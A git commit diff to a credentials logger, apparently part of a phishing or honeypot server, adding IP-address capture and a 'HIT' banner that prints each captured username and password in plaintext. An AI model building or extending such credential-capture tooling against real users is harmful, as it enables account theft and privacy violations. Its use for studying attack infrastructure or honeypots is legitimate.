1faaa4af4c72d5fab485972019484cdb1cf9bea2
Ryan McCrystal <rrmccrystal@gmail.com>
2019-04-18 18:49:07 -1000

    Reformatted log message and added an IP address logger

--- server/credentials_logger.py
+++ server/credentials_logger.py
@@ -6,14 +6,19 @@ from dataclasses import dataclass
 class Credential:
     username: str
     password: str
+    ip_addr: str
 
 
 credential_list = list()
 
 
-def log_credentials(username: str, password: str):
-    credential_list.append(Credential(username, password))
-    print(username, password)
+def log_credentials(username: str, password: str, ip_addr=None):
+    credential_list.append(Credential(username, password, ip_addr))
+    print('\n----------HIT----------\n'
+          'Username: \'{0}\'\n'
+          'Password: \'{1}\'\n'
+          '-----------------------\n'
+          .format(username, password))
 
 
 def get_credentials() -> List[Credential]:
